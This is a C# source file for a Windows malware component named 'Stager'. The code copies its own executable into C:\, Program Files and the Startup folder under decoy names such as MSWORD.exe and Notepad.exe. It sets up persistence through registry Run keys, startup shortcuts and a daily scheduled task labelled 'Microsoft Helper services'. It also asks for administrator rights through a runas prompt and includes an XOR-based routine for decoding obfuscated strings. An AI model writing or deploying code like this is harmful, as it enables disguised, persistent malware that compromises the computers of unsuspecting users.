using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using IWshRuntimeLibrary;
using Microsoft.Win32.TaskScheduler;
using File = System.IO.File;
using System.Text;

namespace Stager
{
    internal class CurrentSystem
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public CurrentSystem()
        {
            //var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);
            Console.WriteLine("Console should be hidden now");
        }
        public bool hasRan()
        {
            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string executableName = Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
            string executableFullPath = Directory.GetCurrentDirectory() + "\\" + executableName;
            if (startupKey.GetValue(executableName) == null)
            {
                return false;
            }
            return true;

        }
        public void AddToStartup()
        {
            string executableName = Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
            string executableFullPath = Directory.GetCurrentDirectory() + "\\" + executableName;
            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            List<string> paths = new List<string> { @"C:\", @"C:\Program Files\", @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" };
            List<string> randomFileNames = new List<string> { "MSWORD.exe", "Notepad.exe" };
            Random rand = new Random();

            foreach (string path in paths)
            {
                string copyPath = Path.Combine(path, randomFileNames[rand.Next(randomFileNames.Count)]);
                if (!File.Exists(copyPath))
                {
                    if (startupKey.GetValue(copyPath) == null)
                    {

                        File.Copy(executableFullPath, copyPath);
                        Console.WriteLine("Copied " + executableFullPath + " to " + copyPath);

                        startupKey.SetValue(path, copyPath);
                        Console.WriteLine("Added " + executableFullPath + " to startup.");

                    }
                }

                string shortcutPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileNameWithoutExtension(copyPath) + ".lnk");
                if (!File.Exists(shortcutPath))
                {
                    WshShell shell = new WshShell();
                    IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
                    shortcut.TargetPath = copyPath;
                    shortcut.Save();

                    Console.WriteLine("Created shortcut " + shortcutPath);
                }

                using (TaskService taskService = new TaskService())
                {
                    try
                    {
                        TaskDefinition taskDefinition = taskService.NewTask();
                        taskDefinition.RegistrationInfo.Description = "Microsoft Helper services";
                        taskDefinition.Triggers.Add(new DailyTrigger { DaysInterval = 1, StartBoundary = DateTime.Today.AddHours(10) });
                        taskDefinition.Actions.Add(new ExecAction(copyPath));
                        taskService.RootFolder.RegisterTaskDefinition(Path.GetFileNameWithoutExtension(copyPath), taskDefinition);
                        Console.WriteLine("Created scheduled task for " + copyPath);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Failed to create scheduled task for " + copyPath + ": " + ex.Message);
                    }
                }
            }
        }

        internal void TryAdmin()
        {
            if (!IsAdministrator())
            {
                // Restart the program as an administrator
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.UseShellExecute = true;
                startInfo.WorkingDirectory = Environment.CurrentDirectory;
                startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
                startInfo.Verb = "runas";

                try
                {
                    Process.Start(startInfo);
                }
                catch (Exception ex)
                {
                    // The user refused the elevation prompt or some other error occurred
                    Console.WriteLine("Failed to start the process as administrator: " + ex.Message);
                    return;
                }

                // The program is already running as an administrator
                // Add your main program logic here
            }

            Environment.Exit(0);
        }
        internal string DecodeString(string encodedString)
        {
            // Step 1: Decrement each character code by 1
            var charArray = encodedString.Select(c => (char)(c - 1)).ToArray();

            // Step 2: Reverse the string
            Array.Reverse(charArray);

            // Step 3: Convert each 2-digit hexadecimal string to a byte and XOR it with 0xFF
            var byteArray = new byte[charArray.Length / 2];
            for (int i = 0; i < charArray.Length; i += 2)
            {
                byte b = byte.Parse(new string(charArray, i, 2), System.Globalization.NumberStyles.HexNumber);
                byteArray[i / 2] = (byte)(b ^ 0xFF);
            }

            // Step 4: Convert the byte array to a string using UTF-8 encoding
            string decodedString = Encoding.UTF8.GetString(byteArray);
            return decodedString;
        }

    internal bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);

        }
    }
}
